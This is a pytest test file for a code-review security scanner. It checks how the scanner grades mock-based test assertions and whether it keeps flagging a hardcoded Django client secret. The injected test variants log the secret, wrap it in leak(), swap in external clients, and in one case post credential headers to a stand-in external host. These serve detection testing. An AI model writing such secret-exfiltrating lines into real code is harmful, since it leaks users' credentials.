from __future__ import annotations

from factoryline.review_audits import security_scan
import pytest


def _write(tmp_path, relative, source):
    path = tmp_path / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf-8")


def _codes(report):
    return [finding["code"] for finding in report["findings"]]


def test_magicmock_annotation_without_fixture_is_unknown(tmp_path):
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def exercise(module): module.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.write.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(report)
    assert "QUALITY_HOLLOW_TEST" not in _codes(report)


def test_nearest_conftest_fixture_proves_nested_magicmock_assertion(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "def exercise(module): module.child.write('x')\n"
        "def test_write(mocked_module):\n"
        "    exercise(mocked_module)\n"
        "    mocked_module.child.write.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    assert report["finding_counts"] == {}


def test_local_noop_fixture_shadows_conftest_mock_and_stays_unknown(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n"
        "    def write(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef module(): return NoOp()\n"
        "def exercise(value): value.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["findings"]
        if item["code"] == "QUALITY_WEAK_TEST_ORACLE"
    )
    assert finding["severity"] == "MEDIUM"
    assert finding["facts"]["whole_test_oracle"] == "UNASSESSED"


def test_nearest_noop_conftest_does_not_inherit_parent_mock_credit(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/conftest.py",
        "import pytest\n"
        "class NoOp:\n"
        "    def write(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef module(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "from unittest.mock import MagicMock\n"
        "def exercise(value): value.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["findings"]
        if item["code"] == "QUALITY_WEAK_TEST_ORACLE"
    )
    assert finding["severity"] == "MEDIUM"
    assert finding["facts"]["whole_test_oracle"] == "UNASSESSED"


def test_rebound_mock_provider_does_not_prove_fixture(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock as MockValue\n"
        "MockValue = NoOp\n"
        "@pytest.fixture\ndef module(): return MockValue()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def test_write(module: MagicMock):\n"
        "    module.write.assert_called_once_with('x')\n",
    )
    codes = _codes(security_scan(tmp_path, cache_enabled=False))
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in codes
    assert "QUALITY_HOLLOW_TEST" not in codes


def test_fixture_name_override_does_not_credit_function_name_parameter(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture(name='other')\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def test_write(mocked_module: MagicMock):\n"
        "    mocked_module.write.assert_called_once_with('x')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_nearest_renamed_fixture_invalidates_parent_mock_credit(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/conftest.py",
        "import pytest\nclass NoOp:\n"
        "    def __getattr__(self, name): return self\n"
        "    def __call__(self, *args): pass\n"
        "@pytest.fixture(name='mocked_module')\ndef other(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_mock_constructor_attribute_override_does_not_prove_child_mock(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n    def __call__(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock(write=NoOp())\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_fixture_parameter_shadowing_mock_constructor_stays_unknown(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n    def __getattr__(self, name): return self\n"
        "    def __call__(self, *args): pass\n"
        "@pytest.fixture\ndef mocked_module(MagicMock=lambda: NoOp()):\n"
        "    return MagicMock()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_decorated_noop_class_is_not_proven_inert(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\n"
        "def add_real_assertion(cls):\n"
        "    cls.assert_called_once_with = lambda self, value: None\n"
        "    return cls\n@add_real_assertion\nclass NoOp:\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef mocked_module(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def test_write(mocked_module):\n"
        "    mocked_module.assert_called_once_with('wrong')\n",
    )
    codes = _codes(security_scan(tmp_path, cache_enabled=False))
    assert "QUALITY_WEAK_TEST_ORACLE" not in codes


_MODEL = """from django.db import models
from django.apps import apps
from django.contrib.auth.hashers import identify_hasher, make_password
from sample.settings import config
import logging
logger = logging.getLogger(__name__)
class SecretField(models.CharField):
    def pre_save(self, model_instance, add):
        secret = getattr(model_instance, self.attname)
        if not getattr(model_instance, 'hash_client_secret', True):
            return super().pre_save(model_instance, add)
        try:
            hasher = identify_hasher(secret)
            logger.debug(f'{model_instance}: {self.attname} uses {hasher}')
        except ValueError:
            logger.debug(f'{model_instance}: {self.attname} needs hashing')
            hashed_secret = make_password(secret, hasher=config.CLIENT_SECRET_HASHER)
            setattr(model_instance, self.attname, hashed_secret)
            return hashed_secret
        return super().pre_save(model_instance, add)
class Record(models.Model):
    client_secret = SecretField()
    def __str__(self): return self.name or self.client_id
class RecordManager(models.Manager):
    pass
class ClientApplication(Record):
    objects = RecordManager()
def select_model():
    return apps.get_model(config.APPLICATION_MODEL)
"""


_FORM = """from urllib.parse import urlencode
MEDIA_TYPE = 'application/x-www-form-urlencoded'
def submit_form(client, path, data=None, **extra):
    extra.setdefault('CONTENT_TYPE', MEDIA_TYPE)
    return client.post(path, data=urlencode(data or {}, doseq=True), content_type=MEDIA_TYPE, **extra)
"""


_TEST = """import pytest
from sample.models import select_model
from tests.helpers import submit_form
@pytest.mark.django_db
def test_login(client):
    Application = select_model()
    client_secret = 'owned-fixture-58a92'
    app = Application.objects.create(client_secret=client_secret)
    response = submit_form(client, '/token', {'client_secret': client_secret})
    assert response.status_code == 200
"""


_CLASS_TEST = """from django.test import TestCase
from sample.models import select_model
from tests.helpers import basic_header, submit_form
Application = select_model()
client_secret = 'owned-fixture-58a92'
class LocalTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.application = Application.objects.create(client_secret=client_secret)
    def test_login(self):
        headers = basic_header('account', client_secret)
        response = submit_form(self.client, '/token', {}, **headers)
        assert response.status_code == 200
"""


_HEADER = """
import base64
def basic_header(user, password):
    user_pass = '{0}:{1}'.format(user, password)
    auth_string = base64.b64encode(user_pass.encode('utf-8'))
    auth_headers = {'HTTP_AUTHORIZATION': 'Basic ' + auth_string.decode('utf-8')}
    return auth_headers
"""


def _fixture_project(root, test_source=_TEST, model_source=_MODEL, helper_source=_FORM):
    sources = {
        "pyproject.toml": "[project.optional-dependencies]\ntest=['pytest>=8','pytest-django>=4']\n",
        "tox.ini": "[testenv]\ncommands=pytest {posargs}\nsetenv=\n DJANGO_SETTINGS_MODULE=tests.settings\n",
        "tests/settings.py": "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\nAPP_MODEL='sample.ClientApplication'\n",
        "sample/settings.py": "from django.conf import settings\nAPPLICATION_MODEL=getattr(settings,'APP_MODEL','sample.ClientApplication')\nconfig=object()\n",
        "sample/models.py": model_source,
        "tests/helpers.py": helper_source,
        "tests/test_auth.py": test_source,
    }
    for name, text in sources.items():
        _write(root, name, text)


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "Application = select_model()",
            "Application = select_model()\n    Application = EvilModel",
        ),
        ("client_secret =", "client = External()\n    client_secret ="),
        ("client_secret=client_secret)", "client_secret=leak(client_secret))"),
        ("{'client_secret': client_secret}", "{'client_secret': leak(client_secret)}"),
        ("def test_login(client):", "def test_login(client=External()):"),
        ("def test_login(client):", "def test_login(client, select_model):"),
    ],
)
def test_django_fixture_unresolved_provider_or_nested_escape_stays_active(
    tmp_path, before, after
):
    assert before in _TEST
    _fixture_project(tmp_path, test_source=_TEST.replace(before, after))
    _assert_fixture_credential_active(tmp_path)


@pytest.mark.parametrize(
    "extra",
    [
        "logger.debug(secret)",
        "logger.debug(model_instance.client_secret)",
        "setattr(logger, 'exposed', secret)",
        "exposed = secret\n        logger.debug(exposed)",
        "setattr = logger.debug",
        "make_password = logger.debug",
    ],
)
def test_django_field_effect_rejects_exports_and_provider_mutation(tmp_path, extra):
    anchor = "        secret = getattr(model_instance, self.attname)"
    source = _MODEL.replace(anchor, anchor + "\n        " + extra)
    _fixture_project(tmp_path, model_source=source)
    _assert_fixture_credential_active(tmp_path)


def test_django_fixture_nearer_renamed_client_override_stays_active(tmp_path):
    _fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "import pytest\n@pytest.fixture(name='client')\ndef remote(): return External()\n",
    )
    _assert_fixture_credential_active(tmp_path)


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "headers = basic_header('account', client_secret)",
            "headers = basic_header('account', client_secret)\n        requests.post('https://external.invalid', headers=headers)",
        ),
        ("**headers)", "**leak(headers))"),
        (
            "class LocalTests(TestCase):",
            "Application = EvilModel\nclass LocalTests(TestCase):",
        ),
        (
            "class LocalTests(TestCase):",
            "Application.objects.create = leak\nclass LocalTests(TestCase):",
        ),
        (
            "def setUpTestData(cls):",
            "def setUpTestData(cls):\n        Application = EvilModel",
        ),
        (
            "class LocalTests(TestCase):",
            "class LocalTests(TestCase):\n    client_class = External",
        ),
        (
            "def test_login(self):",
            "def test_login(self):\n        self.client = External()",
        ),
        (
            "Application.objects.create(client_secret=client_secret)",
            "opaque(Application).objects.create(client_secret=client_secret)",
        ),
    ],
)
def test_django_class_fixture_derived_exports_and_provider_replacement_stay_active(
    tmp_path, before, after
):
    assert before in _CLASS_TEST
    _fixture_project(
        tmp_path,
        test_source=_CLASS_TEST.replace(before, after),
        helper_source=_FORM + _HEADER,
    )
    _assert_fixture_credential_active(tmp_path)


def _assert_fixture_credential_active(root):
    report = security_scan(root, cache_enabled=False)
    findings = [
        finding
        for finding in report["findings"]
        if finding["path"] == "tests/test_auth.py"
        and finding["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert len(findings) == 1
    assert findings[0]["severity"] == "CRITICAL"
